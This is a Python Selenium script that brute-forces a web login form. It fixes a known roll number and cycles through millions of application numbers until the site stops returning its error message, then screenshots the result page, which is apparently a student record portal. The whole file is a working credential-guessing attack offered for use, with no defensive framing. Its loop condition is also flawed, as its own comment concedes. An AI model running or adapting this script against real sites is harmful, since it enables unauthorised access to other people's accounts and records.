from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from selenium import webdriver
from selenium.webdriver.firefox.options import Options


from datetime import datetime ## For debug purposes, total time taken

startTime = datetime.now()
print()

options = Options()
options.headless = True; ## Make sure this is there, else it gonna take a LOOOOOOONG time to go through large range of numbers
driver = webdriver.Firefox(options = options, executable_path= "geckodriver.exe")


driver.get("example.com/login") ## Connect to the desired website

rn = "123456789" ## Enter Roll number, that we know
rollno = driver.find_element_by_name('rollno') # find a input named "rollno" : Roll Number
rollno.clear();
rollno.send_keys(rn)
appno = driver.find_element_by_name('appno')
found = False;

anRange = [0, 12345678] ## What range of Application number should it go through? ==> [lower_Limit, upper_Limit]

currentAN = anRange[0]; ## Start with the lowest
print("Testing For: " + rn); ## Let user know what we are checking for

while (found == False or currentAN > anRange[1]): ## If the Application Number is found break the loop or if we are over the range break it, for some reason it doesn't work I think :P
	driver.get("example.com/login.htm") ## link of website
	rollno = driver.find_element_by_name('rollno') ## Find input named "rollno" : Roll Number
	rollno.clear(); ## clear if it has any value
	rollno.send_keys(rn) ## enter our value
	
	appno = driver.find_element_by_name('appno') ## find input named "appno" : Application Number
	appno.clear()
	an = str(currentAN)
	print("Currently Testing: " + an) ## Let user know what number we are testing right now
	appno.send_keys(an)

	
	submit = driver.find_element_by_xpath("/html/body/table[2]/tbody/tr/td[2]/div/center/table/tbody/tr/td/form/div/table/tbody/tr[3]/td[2]/p/input[1]") ## The XPATH of SUBMIT button
	submit.click()

	try:
		element = WebDriverWait(driver, 10).until(
		        lambda driver: driver.current_url == "example.com/loginResult.asp"
		    ) ## Wait for the webpage to load or else it may not work if the server is slow or you internet is bad

		if ("Please enter valid Roll No. and Application No.") in driver.page_source: ## If the combination of rollno and appno doesn't return any student, 
			currentAN += 1; ## try next one
			
		else:
			print("correct Roll no"); ## break the loop and let user know the correct input
			found = True;
			driver.save_screenshot('screen.png') ## It also takes a screenshot, NOICE AIN'T IT BRUH?

		
	except:
		print("Time-out!"); ## If it can not connect for some reason or something else is wrong, just stop trying.....
		driver.quit();

endtime = datetime.now();
if (found == True):
	print("Correct Application Number is: " + str(currentAN));
else:
	print("Sorry Application Number Not Found In The Given Range");
print(endtime - startTime); ## Just for debug purposes
driver.quit();
